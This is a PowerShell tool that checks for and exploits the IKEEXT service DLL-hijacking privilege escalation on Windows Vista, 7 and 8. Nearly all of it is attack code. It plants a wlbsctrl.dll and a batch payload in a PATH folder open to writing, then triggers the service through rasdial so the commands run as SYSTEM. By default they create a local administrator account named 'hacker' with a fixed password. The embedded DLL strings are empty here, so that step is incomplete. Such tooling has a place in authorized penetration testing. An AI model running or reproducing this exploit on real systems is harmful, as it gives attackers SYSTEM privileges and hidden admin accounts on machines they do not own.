function Invoke-IkeextCheck {

    <#
    .SYNOPSIS   
        Checks whether the host is vulnerable. The details of each check are printed to the console.

    .DESCRIPTION 
        The following checks are done:
        - OS version 
            If Windows Vista/7/8 then potentially vulnerable 
            Otherwise, not vulnerable
        - IKEEXT status and start type 
            If the service is enabled, potentially vulnerable (default)
            Otherwise, not vulnerable 
        - PATH folders with weak permissions
            If at least one folder is found, potentially vulnerable
            Otherwise, not vulnerable 
        - Is 'wlbsctrl.dll' already present in some system folder (i.e. a folder where DLLs can 
            be loaded from)? 
            If 'wlbsctrl.dll' doesn't exists, potentially vulnerable (default) 
            Otherwise, not vulnerable 
        All the conditions need to be met for a host to be vulnerable. Actually, most of them are
        default. 

    .PARAMETER Verbose
        A Boolean used to enable the Verbose mode (disabled by default).
        If the Verbose mode is enabled, the details of each check are printed to the console. Otherwise,
        only the result is displayed (e.g. PASS / FAIL).

    .PARAMETER PassThru
        A Boolean used to specify that we want to return the list of vulnerable PATH folders. This
        switch is used by the Invoke-IkeextExploit method to select the folder in which the exploit
        file will be writen. 

    .OUTPUTS
        A String array representing a list of folders where the DLL payload can be planted (only if 
        the host is vulnerable). If the host is not vulnerable, an empty array is returned. 

    .EXAMPLE
        PS C:\Temp> Invoke-IkeextCheck
        +----------------------------------------------------------+
        |                IKEEXT DLL Hijacking Check                |
        +----------------------------------------------------------+
        [+] Microsoft Windows 7 Professionnel  is vulnerable.
        [+] IKEEXT is enabled.
        [+] Found 2 PATH folder(s) with weak permissions.
        [+] |__ Found: 'C:\Python27\'
        [+] |__ Found: 'C:\Python27\Scripts'
        [+] 'wlbsctrl.dll' was not found on the system.
        [+] Result: VULNERABLE

    .EXAMPLE 
        PS C:\Temp> Invoke-IkeextCheck -Verbose
        +----------------------------------------------------------+
        |                IKEEXT DLL Hijacking Check                |
        +----------------------------------------------------------+
        [*] Checking system version
        [*] |__ OS Version: 6.1.7601
        [*] |__ OS Name: Microsoft Windows 7 Professionnel
        [*] |__ OS Architecture: 64 bits
        [+] Microsoft Windows 7 Professionnel  is vulnerable.

        [*] Checking IKEEXT service status and start mode
        [*] |__ Service status: Not running
        [*] |__ Service start mode: Manual
        [+] IKEEXT is enabled.

        [*] Searching for PATH folders with weak permissions
        [+] |__ Access granted: 'C:\Python27\'
        [+] |__ Access granted: 'C:\Python27\Scripts'
        [-] |__ Access denied: 'C:\Windows\system32'
        [-] |__ Access denied: 'C:\Windows'
        [-] |__ Access denied: 'C:\Windows\System32\Wbem'
        [-] |__ Access denied: 'C:\Windows\System32\WindowsPowerShell\v1.0\'
        [+] Found 2 PATH folder(s) with weak permissions.
        [+] |__ Found: 'C:\Python27\'
        [+] |__ Found: 'C:\Python27\Scripts'

        [*] Searching for 'wlbsctrl.dll' on the system
        [+] 'wlbsctrl.dll' was not found on the system.

        [+] Result: VULNERABLE
    #>

    param(
        [switch] $Verbose = $False,
        [switch] $PassThru = $False 
    )

    Write-Host "+----------------------------------------------------------+"
    Write-Host "|                IKEEXT DLL Hijacking Check                |"
    Write-Host "+----------------------------------------------------------+"

    $is_vulnerable = $True

    # --------------------------------------------------------------------------------
    # Check Windows version (i.e. is this version affected by the vulnerability?)
    # --------------------------------------------------------------------------------
    if ($Verbose) { Write-Host -NoNewLine -ForeGroundColor Blue "[*] " ; Write-Host "Checking system version" }
    $os_wmi_object = Get-WmiObject -Class Win32_OperatingSystem
    $os_version = $os_wmi_object.version
    $os_name = $os_wmi_object.caption
    $os_arch = $os_wmi_object.OSArchitecture

    $os_v1 = "6.0" # Windows Vista or Windows Server 2008
    $os_v2 = "6.1" # Windows 7 or Windows Server 2008 R2
    $os_v3 = "6.2" # Windows 8 or Windows Server 2012

    if ($Verbose) {
        Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ OS Version: $($os_version)"
        Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ OS Name: $($os_name)"
        Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ OS Architecture: $($os_arch)"
    }
    
    if ($os_version -Like "$os_v1*" -or $os_version -Like "$os_v2*" -or $os_version -Like "$os_v3*") {
        Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "$($os_name) is vulnerable."
    } else {
        $is_vulnerable = $False 
        Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "$($os_name) is not vulnerable."
    }

    if ($Verbose) { Write-Host "" }

    # --------------------------------------------------------------------------------
    # Check the IKEEXT service's status (i.e. is it running or not?)
    # --------------------------------------------------------------------------------
    if ($Verbose) { Write-Host -NoNewLine -ForeGroundColor Blue "[*] " ; Write-Host "Checking IKEEXT service status and start mode" }
    $service = Get-Service -Name "IKEEXT"

    if ($service.Status -eq "Running"){ 
        if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ Service status: Running" }
    } else {
        if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ Service status: Not running" }
    }

    # --------------------------------------------------------------------------------
    # Check the IKEEXT service's start mode
    # --------------------------------------------------------------------------------
    $start_mode = (Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='IKEEXT'").StartMode
    if ($start_mode -eq "Auto") {
        if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ Service start mode: Auto" }
        Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "IKEEXT is enabled."
    } elseif ($start_mode -eq "Manual") {
        if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ Service start mode: Manual" }
        Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "IKEEXT is enabled."
    } else {
        $is_vulnerable = $False 
        if ($Verbose) { Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "|__ Service start mode: Disabled" }
        Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "IKEEXT is not disabled."
    }

    if ($Verbose) { Write-Host "" }

    # --------------------------------------------------------------------------------
    # Search for writable folders in the environment PATH
    # --------------------------------------------------------------------------------
    if ($Verbose) { Write-Host -NoNewLine -ForeGroundColor Blue "[*] " ; Write-Host "Searching for PATH folders with weak permissions" }
    # Get the system's PATH from the registry 
    $sys_env_path  = ((Get-ItemProperty -Path Registry::"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "Path").Path).Split("{;}")
    
    # List of vulnerable foders if any 
    $vulnerable_folders = @()

    # Generate a random name for the temporary file 
    $final_string = @()
    For ($i=1; $i -le 16; $i++) {
        $final_string += [CHAR][BYTE](get-random -min 97 -max 122) # lowercase only 
    }
    $dummy_file = (-join $final_string) + ".txt"

    # For each folder in the PATH, we check whether we have R/W access 
    $sys_env_path | foreach {
        if ($_.length -gt 0) {
            $test_path = Test-Path -Path $_ -errorAction SilentlyContinue -errorVariable errors
            if ($errors.count -eq 0) {
                if ($test_path) {
                    # For each folder we try to create a dummy TXT file.
                    # If there is no error, the file was created successfully so we have write access.
                    # Otherwise, an error occurred, which most probably mean that we don't have write access.
                    $dummy_file_path = "$($_)\$($dummy_file)"
                    New-Item "$($dummy_file_path)" -Type file -ErrorAction SilentlyContinue -ErrorVariable errors | Out-Null

                    if ($errors.count -eq 0)
                    {
                        # File creation succeeded
                        $vulnerable_folders += $_ # We add teh path to the list of vulnerable folders 
                        if ($Verbose) { Write-Host -NoNewLine -ForeGroundColor Green "[+] " ; Write-Host "|__ Access granted: '$_'" }
                        Remove-Item "$($dummy_file_path)" # Clean the mess 
                    } else {
                        # Folder exists but we can't create a file there 
                        if ($Verbose) { Write-Host -NoNewLine -ForeGroundColor Red "[-] " ; Write-Host "|__ Access denied: '$_'" }
                    }
                } else {
                    # Folder doesn't exist 
                    if ($Verbose) { Write-Host -NoNewLine -ForeGroundColor Yellow "[!] " ; Write-Host "|__ Invalid path: '$_'" }
                }
            } else {
                # An error occured because we don't have read access to a parent folder 
                if ($Verbose) { Write-Host -NoNewLine -ForeGroundColor Red "[-] " ; Write-Host "|__ Access denied: '$_'" }
            }
        }
    }

    if ($vulnerable_folders.count -ge 1) {
        Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "Found $($vulnerable_folders.count) PATH folder(s) with weak permissions."
        $vulnerable_folders | foreach {
            Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "|__ Found: '$($_)'"
        }
    } else {
        $is_vulnerable = $False 
        Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "Found $($vulnerable_folders.count) PATH folder(s) with weak permissions."
    }

    if ($Verbose) { Write-Host "" }

    # --------------------------------------------------------------------------------
    # Check whether 'wlbsctrl.dll' is already present on the file system
    # --------------------------------------------------------------------------------
    if ($Verbose) { Write-Host -NoNewLine -ForeGroundColor Blue "[*] " ; Write-Host "Searching for 'wlbsctrl.dll' (DLL search Path only)" }
    $dll_files = @() # Will hold the list of found files if any 

    # 32-bit System directory (C:\Windows\System32)
    $dll_files += Get-ChildItem -Path "C:\Windows\System32" -Filter "wlbsctrl.dll" -ErrorAction SilentlyContinue -Force
    # 16-bit System directory (C:\Windows\System)
    $dll_files += Get-ChildItem -Path "C:\Windows\System" -Filter "wlbsctrl.dll" -ErrorAction SilentlyContinue -Force
    # Windows directory (C:\Windows)
    $dll_files += Get-ChildItem -Path "C:\Windows" -Filter "wlbsctrl.dll" -ErrorAction SilentlyContinue -Force
    # Directories in the system's PATH environment variable
    $sys_env_path = ((Get-ItemProperty -Path Registry::"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "Path").Path).Split("{;}")

    # For each folder in the PATH 
    $sys_env_path | foreach {
        if($_.length -gt 0){
            if (Test-Path -ErrorAction SilentlyContinue $_) {
                $dll_files += Get-ChildItem -Path $_ -Filter "wlbsctrl.dll" -ErrorAction SilentlyContinue -Force
            }
        }
    }

    # Empty entries need to be 'sanitized' 
    $dll_files_final = @()
    $dll_files | foreach { if (-not $_ -eq "") { $dll_files_final += $_ } }

    # If the list is empty, it means the file was not found 
    if ($dll_files_final.count -gt 0) {
        $dll_files_final | foreach {
            if ($Verbose) { Write-Host -NoNewLine -ForeGroundColor Blue "[*] " ; Write-Host "|__ Found file: '$($_.FullName)'" }
        }
        $is_vulnerable = $False 
        Write-Host -NoNewLine -ForeGroundColor Red "[-] " ; Write-Host "'wlbsctrl.dll' was found." ; 
    } else {
        Write-Host -NoNewLine -ForeGroundColor Green "[+] " ; Write-Host "'wlbsctrl.dll' wasn't found."
    }

    if ($Verbose) { Write-Host "" }

    # --------------------------------------------------------------------------------
    # If all the prerequisites are met (OS version, service status, PATH folder 
    # configured with weak permissions, 'wlbsctrl.dll' doesn't exist) are met, the 
    # machine is vulnerable 
    # --------------------------------------------------------------------------------
    if ($is_vulnerable) {
        Write-Host -NoNewLine -ForeGroundColor Green "[+] " ; Write-Host "Result: VULNERABLE`n"
        if ($PassThru) { return $vulnerable_folders }
    } else {
        Write-Host -NoNewLine -ForeGroundColor Red "[-] " ; Write-Host "Result: NOT VULNERABLE`n"
        if ($PassThru) { return @() }
    }
}


function Invoke-IkeextExploit {

    <#
    .SYNOPSIS 
        Executes Invoke-IkeextCheck first to check whether the host is vulnerable and then 
        automatically exploits it using the first weak environment PATH folder.

    .DESCRIPTION 
        If the host is vulnerable, it will try to exploit it. 
            If the IKEEXT start type is AUTO:
                The exploit files will be dropped to the first weak PATH folder, provided
                that the switch '-Force' was set in the command line (safety override).
            Else if the IKEEXT start type is MANUAL:
                The exploit files will be dropped to the first weak PATH folder.
                Then, the service start will be triggered by trying to open a dummy VPN
                connection (using rasdial). 
        The exploit files are:
            - 'wlbsctrl.dll': this DLL will create a CMD process as SYSTEM to execute 
                a BATCH file.
            - 'wlbsctrl_payload.bat': the BATCH file that will be executed 
        A default BATCH payload is included in this script:
            - it will use 'net user' to create a new user ('hacker' with password 
                'SuperP@ss123').
            - it will use "net localgroup" to add the user to the local administrators
                group (the name of the group is automatically retrieved by the script).
        Otherwise, a custom BATCH payload can be provided using '-Payload .\Path\To\File.tx't'.
            This file must contain one command per line. The commands will be automatically 
            modified to redirect the output to a log file. 
        Finally, two default commands are added:
            - The first command will set IKEEXT start type to MANUAL.
            - The second command will attempt to stop the service, so it can be exploited 
                again without requiring a reboot. 

    .PARAMETER Verbose
        A Boolean used to enable the Verbose mode (disabled by default).
        If the Verbose mode is enabled, the details of exploit step check are printed to the 
        console. 

    .PARAMETER Force 
        A Boolean used to force the script to drop the exploit files when the startup mode 
        of the service is AUTO. Indeed, in this case, we can't trigger the exploit so a manual 
        reboot is required. 

    .EXAMPLE
        PS C:\Temp> Invoke-IkeextExploit
        +----------------------------------------------------------+
        |                IKEEXT DLL Hijacking Check                |
        +----------------------------------------------------------+
        [+] Microsoft Windows 7 Professionnel  is vulnerable.
        [+] IKEEXT is enabled.
        [+] Found 2 PATH folder(s) with weak permissions.
        [+] |__ Found: 'C:\Python27\'
        [+] |__ Found: 'C:\Python27\Scripts'
        [+] 'wlbsctrl.dll' was not found on the system.
        [+] Result: VULNERABLE

        +----------------------------------------------------------+
        |               IKEEXT DLL Hijacking Exploit               |
        +----------------------------------------------------------+
        [*] Preparing exploit files...
        [*] Trying to trigger the exploit (max 30s).
        [*] Found log file: "C:\Python27\\wlbsctrl_hunjxwll.txt".
        [+] Exploit successful!
        [*] Waiting for IKEEXT to be stopped (max 30s).
        [+] IKEEXT was stopped.
        [*] Performing cleanup.

    .EXAMPLE 
        PS C:\Temp> Invoke-IkeextExploit -Verbose
        +----------------------------------------------------------+
        |                IKEEXT DLL Hijacking Check                |
        +----------------------------------------------------------+
        [+] Microsoft Windows 7 Professionnel  is vulnerable.
        [+] IKEEXT is enabled.
        [+] Found 2 PATH folder(s) with weak permissions.
        [+] |__ Found: 'C:\Python27\'
        [+] |__ Found: 'C:\Python27\Scripts'
        [+] 'wlbsctrl.dll' was not found on the system.
        [+] Result: VULNERABLE

        +----------------------------------------------------------+
        |               IKEEXT DLL Hijacking Exploit               |
        +----------------------------------------------------------+
        [*] Preparing exploit files...
        [*] |__ BATCH payload: "C:\Python27\\wlbsctrl_payload.bat"
        [*] |__ DLL (64 bits): "C:\Python27\\wlbsctrl.dll"

        [*] Trying to trigger the exploit (max 30s).
        [*] |__ Dummy VPN profile: "C:\Python27\\rasphone.pbk"
        [*] |__ Starting rasdial...
        [*] Found log file: "C:\Python27\\wlbsctrl_hrbuajch.txt".
        [+] Exploit successful!

        [*] Waiting for IKEEXT to be stopped (max 30s).
        [+] IKEEXT was stopped.

        [*] Performing cleanup.
        [*] |__ Deleting "C:\Python27\\wlbsctrl_payload.bat"
        [*] |__ Deleting "C:\Python27\\wlbsctrl.dll"
        [*] |__ Deleting "C:\Python27\\rasphone.pbk"
    #>

    param(
        [switch] $Verbose = $False,
        [switch] $Force = $False,
        [string] $Payload = ""
    )

    function Invoke-CleanExit {
        param($files)

        if ($Verbose) { Write-Host "" }
        Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "Performing cleanup."
        $files | foreach {
            if (Test-Path $_) {
                if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ Deleting `"$($_)`"" }
                Remove-Item "$($_)"
            }
        }
        return  
    }

    $timeout = 30

    [String[]]$vulnerable_folders = Invoke-IkeextCheck -PassThru 

    Write-Host "+----------------------------------------------------------+"
    Write-Host "|               IKEEXT DLL Hijacking Exploit               |"
    Write-Host "+----------------------------------------------------------+"

    if ($vulnerable_folders.count -ge 1) {
        # The host is vulnerable 

        $files_created = @()

        # We will use the first vulnerable folder 
        $vuln_folder = $vulnerable_folders[0] 

        Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "Preparing exploit files..."

        # --------------------------------------------------------------------------------
        # Generate a random name for the log file 
        # --------------------------------------------------------------------------------
        $log_name_tmp = @()
        For ($i=1; $i -le 8; $i++) {
            $log_name_tmp += [CHAR][BYTE](get-random -min 97 -max 122) # lowercase only 
        }
        $log_name = "wlbsctrl_" + (-join $log_name_tmp) + ".txt"

        # --------------------------------------------------------------------------------
        # Generate a list of commands to execute as SYSTEM 
        # --------------------------------------------------------------------------------
        $commands = @()

        if ($Payload -eq "") {
            # If no custom payload was provided, we use default commands. 

            # Commands for creating a local user and add it to the local admins group 
            $commands += "net user hacker SuperP@ss123 /ADD"
            $admin_group = Get-WmiObject win32_group -Filter "LocalAccount = $True And SID = 'S-1-5-32-544'" | Select -Expand Name
            $commands += "net localgroup `"$($admin_group)`" hacker /ADD"

        } else {
            # A custom payload was provided, we will use it instead of the default commands  
            try {
                if (Test-Path $Payload -PathType Leaf) {
                    if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ Reading commands from: `"$($Payload)`"" }
                    foreach($line in Get-Content $Payload) {
                        $commands += $line 
                    }
                } else {
                    Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; "File not found: '$($Payload)'." 
                    Invoke-CleanExit $files_created 
                    return 
                }
            } catch {
                Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; "Unknown error: '$($Payload)'." 
                Invoke-CleanExit $files_created 
                return 
            } 
        }

        # Add this command at the end to configure startup type to MANUAL. Indeed, 
        # if the service is in MANUAL mode and is triggered, its startup type is set to 
        # AUTO. So we must set it back to MANUAL. 
        $commands += "powershell -command `"Set-Service 'IKEEXT' -StartupType manual`""
        # Add this command at the end to stop the service and then execute the actual 
        # payload (this way we can exploit it again without requiring a reboot)
        $commands += "powershell -command `"while (`$True) { if ((Get-Service -Name 'IKEEXT').Status -eq 'Running') { net stop IKEEXT ; break } else { Write-Output 'Trying to stop IKEEXT' ; Start-Sleep 5 }}`""

        # --------------------------------------------------------------------------------
        # Generate the BATCH payload from the list of commands 
        # --------------------------------------------------------------------------------
        $bat_payload = @()
        $commands | foreach {
            $bat_payload += "echo ================================================== >> `"$($vuln_folder)\$($log_name)`" "
            $bat_payload += "echo COMMAND: `"$($_)`" >> `"$($vuln_folder)\$($log_name)`" " 
            $bat_payload += "echo ================================================== >> `"$($vuln_folder)\$($log_name)`" "
            $bat_payload += "$($_) >> `"$($vuln_folder)\$($log_name)`" "
            $bat_payload += "echo. >> `"$($vuln_folder)\$($log_name)`" "
        }

        # --------------------------------------------------------------------------------
        # Write the BATCH payload to the vulnerable folder 
        # --------------------------------------------------------------------------------
        try {
            $bat_filename = "$($vuln_folder)\wlbsctrl_payload.bat"
            $bat_payload | foreach {
                $_ | Out-File "$($bat_filename)" -Encoding ascii -Append 
            }
            $files_created += $bat_filename
            if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ BATCH payload: `"$($bat_filename)`"" } 
        } catch {
            Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; "|__ Error writing file: '$($bat_filename)'." 
            Invoke-CleanExit $files_created 
            return 
        }

        # --------------------------------------------------------------------------------
        # Plant the DLL payload  
        # --------------------------------------------------------------------------------
        <#
            # Read the DLL file and Base64-encode
            $dll_content = Get-Content -Path .\DllInjection.dll -Encoding Byte
            $dll_content_enc = [System.Convert]::ToBase64String($dll_content)
            $dll_content_enc | Out-File .\DllInjection.dll.txt

            # Base64-decode and write the DLL file 
            $dll_content = [System.Convert]::FromBase64String($dll_content_enc)
            Set-Content -Path .\DllInjection_test.dll -Value $dll_content -Encoding Byte
        #>
        # Base64-encoded DLLs 
        $dll_32 = ""
        $dll_64 = ""

        $dll_path = "$($vuln_folder)\wlbsctrl.dll"
        $os_arch = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture

        try {
            if ($os_arch -Like "64*") {
                # We use the 64 bits DLL 
                $dll_content = [System.Convert]::FromBase64String($dll_64)
                Set-Content -Path "$($dll_path)" -Value $dll_content -Encoding Byte
                if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ DLL (64 bits): `"$($dll_path)`"" }
                $files_created += $dll_path
            } elseif ($os_arch -Like "32*") {
                # We use the 32 bits DLL 
                $dll_content = [System.Convert]::FromBase64String($dll_32)
                Set-Content -Path "$($dll_path)" -Value $dll_content -Encoding Byte
                if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ DLL (32 bits): `"$($dll_path)`"" }
                $files_created += $dll_path
            } else {
                # Is this really possible? Let's handle it anyway... 
                Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "|__ Unknown architecture." 
                Invoke-CleanExit $files_created  
                return 
            }
        } catch {
            Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "|__ Error writing file: `"$($dll_path)`""
            Invoke-CleanExit $files_created
            return 
        }

        if ($Verbose) { Write-Host "" }

        # --------------------------------------------------------------------------------
        # Trigger the exploit 
        # --------------------------------------------------------------------------------
        if ((Get-Service -Name "IKEEXT").Status -eq "Running") { 
            # If the service is running, a reboot will be required (IKEEXT can't be stopped by a 
            # low-privileged user)

            if ($Force) {
                # We know what we are doing, right?... 
                Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "The exploit is ready. A reboot is now required to trigger it."
                Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "Don't forget to remove exploit files after the reboot."
                $files_created | foreach {
                    Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ `"$($_)`""
                }
            } else {
                # Since the exploit requires a reboot, we must make sure we know what we are doing. 
                Write-Host "[!] " -NoNewLine -ForeGroundColor Yellow ; Write-Host "The exploit requires a reboot. Use -Force to drop exploit files anyway."
                Invoke-CleanExit $files_created
                return 
            }
        } else {
            # We can start the service by opening a VPN connection. We'll use rasdial for now but
            # it would be better to do it in full PowerShell

            Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "Trying to trigger the exploit (max $($timeout)s)." 

            $pbk_profile_file = "$($vuln_folder)\rasphone.pbk"
            try {
                $pbk = "W0lLRUVYVF0NCk1FRElBPXJhc3RhcGkNClBvcnQ9VlBOMi0wDQpEZXZpY2U9V2FuIE1pbmlwb3J0IChJS0V2MikNCkRFVklDRT12cG4NClBob25lTnVtYmVyPTEyNy4wLjAuMQ=="
                $pbk_profile = [System.Convert]::FromBase64String($pbk)
                Set-Content -Path $pbk_profile_file -Value $pbk_profile -Encoding Byte
                if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ Dummy VPN profile: `"$($pbk_profile_file)`"" }
                $files_created += $pbk_profile_file
            } catch {
                Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "|__ Couldn't create VPN profile: `"$($pbk_profile_file)`""
                Invoke-CleanExit $files_created
                return 
            }

            if ($Verbose) { Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "|__ Starting rasdial..." }
            Start-Process -FilePath "rasdial" -ArgumentList "IKEEXT test test /PHONEBOOK:`"$($pbk_profile_file)`"" -WindowStyle "Hidden"

            $success = $False 
            for ($i=1; $i -le $timeout; $i++) {
                Start-Sleep 1
                if (Test-Path "$($vuln_folder)\$($log_name)") {
                    Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "Found log file: `"$($vuln_folder)\$($log_name)`"."
                    $success = $True
                    break 
                }
            }
            # If the payload was executed, we check whether the service stopped 
            if ($success) {
                Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "Exploit successful!"
                if ($Verbose) { Write-Host "" }
                $success = $False 
                Write-Host "[*] " -NoNewLine -ForeGroundColor Blue ; Write-Host "Waiting for IKEEXT to be stopped (max $($timeout)s)." 
                for ($i=1; $i -le $timeout; $i++) {
                    Start-Sleep 1
                    If ((Get-Service -Name 'IKEEXT').Status -eq 'Stopped') {
                        Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "IKEEXT was stopped."
                        $success = $True 
                        break 
                    }
                }
                if ( -Not $success ) {
                    Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "IKEEXT couldn't be stopped."
                }
            } else {
                Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "Exploit failed."
            }
            Invoke-CleanExit $files_created
            return 
        }
    } else {
        # The host is not vulnerable 
        Write-Host "[-] " -NoNewLine -ForeGroundColor Red ; Write-Host "The host is not vulnerable. Nothing to exploit..."
    }
}
